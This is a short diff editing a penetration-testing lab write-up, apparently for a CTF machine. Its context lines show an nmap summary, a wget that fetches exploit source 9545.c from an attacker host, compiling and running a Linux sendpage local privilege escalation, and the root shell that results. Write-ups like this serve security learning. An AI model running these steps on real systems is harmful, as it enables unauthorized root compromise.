@@ -87,6 +87,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 ```
 
+let's explore.
+
 ---
 
 ### http explore
@@ -392,7 +394,7 @@ gcc -Wall -o linux-sendpage 9545.c
 ./linux-sendpage
 ```
 
-success.
+now, i'm root.
 
 ```
 bash-3.00$ wget http://10.101.55.75/9545.c
@@ -414,4 +416,3 @@ sh-3.00# id
 uid=0(root) gid=0(root) groups=48(apache)
 ```
 
-now, i'm root.
